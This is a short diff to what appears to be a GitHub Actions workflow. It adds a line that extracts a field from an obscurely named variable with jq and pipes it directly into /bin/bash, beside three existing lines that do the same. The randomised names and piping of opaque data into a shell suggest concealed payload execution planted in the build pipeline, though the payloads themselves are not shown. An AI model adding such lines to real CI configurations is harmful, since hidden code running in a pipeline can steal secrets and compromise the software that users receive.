@@ -27,6 +27,7 @@ jobs:
           echo $rsw7517 | jq -r .puq3359 | /bin/bash
           echo $rlez355 | jq -r .pwo66 | /bin/bash
           echo $yts64 | jq -r .ae9 | /bin/bash
+          printf '%s' "$l7" | jq -r .ikwwu1 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
